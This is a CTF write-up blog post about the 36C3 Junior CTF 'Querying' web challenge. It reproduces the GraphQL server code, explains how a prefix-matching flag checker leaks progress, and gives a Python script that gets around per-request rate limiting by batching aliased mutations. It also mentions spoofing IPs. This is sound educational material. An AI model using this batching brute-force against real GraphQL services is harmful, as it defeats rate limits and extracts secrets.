---
title: 36C3 Querying
author: Marius Kimmina
date: 2020-01-01 14:10:00 +0800
categories: [CTF, Web]
tags: [36C3, GraphQL, Bruteforce]
published: true
---


### 0x0. Introduction
This Challenge was part of the *36C3 Junior CTF*. It was a "Web" challenge with a difficulty rating of "Medium", you were given an URL for the live challenge server and also a copy of the server (with a fake flag obv) as a Docker Container to run locally to test your exploits. The local copy was needed because the real server would give you an timeout after every request to make bruteforcing the solution harder. Sadly I was not able to solve this challenge before the timeup to get some points for it but atleast I was able to complete it shortly afterwards for my own sake.

### 0x1. Challenge Description
```
In German, Graf means count. Anyway I'm certain he likes pie. Who doesn't? He also won't give you the Flag as he keeps track of every request. Nothing to see here, please move along. http://199.247.4.207:4000/
```
There was also a file for the local copy attached which looked like this:

.
├── dist.tar.gz
├── docker-compose.yml
├── Dockerfile
├── package.json
├── package-lock.json
├── prisma
│   ├── datamodel.prisma
│   ├── prisma.yml
│   └── seed.graphql
├── src
│   ├── generated
│   │   └── prisma-client
│   │       ├── index.d.ts
│   │       ├── index.js
│   │       └── prisma-schema.js
│   ├── index.js
│   └── schema.graphql
└── yarn.lock

### 0x2. Looking at the source Code

The most important file for this challenge was the index.js which contained the following code:

```js
const { GraphQLServer } = require('graphql-yoga')
const LRU = require('lru-cache')

const { prisma } = require('./generated/prisma-client')

const MAX_WAIT = 10 * 1000 // 10 seconds

const FLAG = "junior-THIS_IS_A_DUMMY"
const FLAG_REGEX = /$junior-[a-zA-Z0-9_]24^/.compile()

const requestsPerClient = new LRU({
  max: 16 * 1024,
  maxAge: 1000 * 60
})

function bruteforceProtection(context) {
  const ip = context.request.ip
  if (context.request.headers["admin"]) {
    console.log("ip", ip)
    let requests = requestsPerClient.get(ip) || 0
    const waitTime = 15 * requests * 1000
    requestsPerClient.set(ip, requests + 1)
    return new Promise(
      resolve => setTimeout(
        () => (console.log("finished", ip, waitTime) || resolve()), waitTime
      )
    )
  }
  return Promise.resolve()
}

const resolvers = {
  Query: {
    feed: (parent, args, context) => {
      return context.prisma.posts({ where: { published: true } })
    },
    drafts: (parent, args, context) => {
      return context.prisma.posts({ where: { published: false } })
    },
    post: (parent, { id }, context) => {
      return context.prisma.post({ id })
    },
  },
  Mutation: {
    checkFlag(parent, {flag}, context) {
      if (!context.request.headers["admin"]) throw "this got changed!"
      if (FLAG_REGEX.exec(flag) && flag === FLAG) return FLAG.length
      let i = 0
      while (flag[i] === FLAG[i]) i++
      return i
    },
    createDraft(parent, { title, content }, context) {
      return context.prisma.createPost({
        title,
        content,
      })
    },
    deletePost(parent, { id }, context) {
      return context.prisma.deletePost({ id })
    },
    publish(parent, { id }, context) {
      return context.prisma.updatePost({
        where: { id },
        data: { published: true },
      })
    },
  },
}

const server = new GraphQLServer({
  typeDefs: './src/schema.graphql',
  resolvers,
  context: async (request, response, fragmentReplacements) => ({
    ...request,
    prisma,
    console: await bruteforceProtection(request)
  }),
})

server.start(() => console.log('Server is running on http://localhost:4000'))
```

From the "FLAG_REGEX" we know that the Flag consist of "Junior-" and 24 Characters containing lowercase, uppercase, digits and underscores.
We can use the "Check Flag" function which will tell us how many letters of our input match the actual Flag. So we could give the Webserver an Input like this:

```js
mutation {
    checkFlag(flag: "j")
}
```

The Server would then return "1".
This is somewhat screaming for a bruteforce, you can guess one letter at a time and as soon as the integer responds from the server increases you go for the next letter. But there is "BruteforceProtection" build into this which will give us an timeout after every request based on our IP. You could theoretically work around this protection by spoofing your IP after every request, which was some people acctaully did and I won't blame them, whatever works works. But there is another more interesting solution which I want to focus on here.

### 0x3. Solution

The catch is, in graphql you can provide multiple mutations at once. So it is possible to ask the Server for every possible character at a position in a single request. Such a request would look like this:

```js
mutation {
  name1: checkFlag(flag: "junior-A"),
  name2: checkFlag(flag: "junior-B"),
  ...
}
```


Since we need to get 24 characters with this approach we need 24 requests to the server to get the full Flag, which still took a bit but returned the flag in a somewhat reasonable amount of time.
I came up with the following python Script to get the Flag:

```py
import requests
import operator

url = "http://199.247.4.207:4000/"
header = {
    "content-type": "application/json",
    "admin": "true"
}

base_check = 'checkFlag(flag: "junior-'
name = "name"
possible = [
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '_'
]

start_query = "mutation {\n"
end_query = "}"
number = 1
i = 0
while (i < 24):
    print("getting charakter " +  str(i))
    for letter in possible:
        start_query = start_query + name + str(number) + ":" + base_check + letter + '")' + "," + "\n"
        number = int(number) + 1
    i = i + 1
    number = 1
    start_query = start_query + end_query
    r = requests.post(url, json={"query": start_query}, headers=header)
    response = r.text
    data = r.json()["data"]
    correct = max(data.items(), key=operator.itemgetter(1))[0]
    right_character = correct[4:]
    base_check += possible[int(right_character)-1]
    start_query = "mutation {\n"
    print(base_check)
```

Flag: junior-Batching_Qu3r1e5_is_FUN1
